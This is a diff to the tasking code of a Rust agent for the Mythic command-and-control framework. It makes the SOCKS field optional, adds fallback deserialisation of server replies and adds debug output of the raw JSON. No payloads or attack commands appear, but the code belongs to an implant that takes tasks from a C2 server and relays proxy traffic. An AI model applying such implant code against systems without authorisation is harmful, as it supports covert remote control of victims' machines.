@@ -28,8 +28,14 @@ pub struct AgentTask {
 #[derive(Debug, Deserialize, Serialize)]
 pub struct GetTaskingResponse {
     pub tasks: Vec<AgentTask>,
-    #[serde(default)]
+    #[serde(default, skip_serializing_if = "Option::is_none")]
     pub socks: Option<Vec<SocksMsg>>,
+}
+
+/// Fallback response structure if the main one fails
+#[derive(Debug, Deserialize, Serialize)]
+pub struct GetTaskingResponseFallback {
+    pub tasks: Vec<AgentTask>,
 }
 
 /// Response to send back to Mythic on "post_response"
@@ -37,8 +43,15 @@ pub struct GetTaskingResponse {
 pub struct PostTaskingResponse {
     pub action: String,
     pub responses: Vec<serde_json::Value>,
-    #[serde(skip_serializing_if = "Vec::is_empty")]
-    pub socks: Vec<SocksMsg>,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub socks: Option<Vec<SocksMsg>>,
+}
+
+/// Fallback response structure for post_response if the main one fails
+#[derive(Debug, Deserialize, Serialize)]
+pub struct PostTaskingResponseFallback {
+    pub action: String,
+    pub responses: Vec<serde_json::Value>,
 }
 
 /// Used for holding any data passed to background tasks
@@ -103,7 +116,28 @@ impl Agent {
         .to_string();
 
         let body = self.c2profile.send_data(&json_body)?;
-        let response: GetTaskingResponse = serde_json::from_str(&body)?;
+        
+        // Debug: Print the received JSON to understand the structure
+        eprintln!("DEBUG: Received JSON from Mythic: {}", body);
+        
+        let response = match serde_json::from_str::<GetTaskingResponse>(&body) {
+            Ok(resp) => resp,
+            Err(e) => {
+                eprintln!("DEBUG: Failed to deserialize GetTaskingResponse, trying fallback: {}", e);
+                // Try fallback structure without socks field
+                match serde_json::from_str::<GetTaskingResponseFallback>(&body) {
+                    Ok(fallback) => GetTaskingResponse {
+                        tasks: fallback.tasks,
+                        socks: None,
+                    },
+                    Err(fallback_err) => {
+                        eprintln!("DEBUG: Fallback also failed: {}", fallback_err);
+                        eprintln!("DEBUG: JSON was: {}", body);
+                        return Err(Box::new(fallback_err));
+                    }
+                }
+            }
+        };
 
         let mut all_tasks: Vec<AgentTask> = Vec::new();
 
@@ -146,12 +180,34 @@ impl Agent {
         let body = PostTaskingResponse {
             action: "post_response".to_string(),
             responses: completed.to_owned(),
-            socks: socks_to_send,
+            socks: if socks_to_send.is_empty() { None } else { Some(socks_to_send) },
         };
 
         let req_payload = serde_json::to_string(&body)?;
         let json_response = self.c2profile.send_data(&req_payload)?;
-        let response: PostTaskingResponse = serde_json::from_str(&json_response)?;
+        
+        // Debug: Print the received JSON to understand the structure
+        eprintln!("DEBUG: Received JSON response from send_tasking: {}", json_response);
+        
+        let response = match serde_json::from_str::<PostTaskingResponse>(&json_response) {
+            Ok(resp) => resp,
+            Err(e) => {
+                eprintln!("DEBUG: Failed to deserialize PostTaskingResponse, trying fallback: {}", e);
+                // Try fallback structure without socks field
+                match serde_json::from_str::<PostTaskingResponseFallback>(&json_response) {
+                    Ok(fallback) => PostTaskingResponse {
+                        action: fallback.action,
+                        responses: fallback.responses,
+                        socks: None,
+                    },
+                    Err(fallback_err) => {
+                        eprintln!("DEBUG: Fallback also failed: {}", fallback_err);
+                        eprintln!("DEBUG: JSON was: {}", json_response);
+                        return Err(Box::new(fallback_err));
+                    }
+                }
+            }
+        };
 
         // Handle continued tasks
         let mut pending_tasks: Vec<AgentTask> = Vec::new();
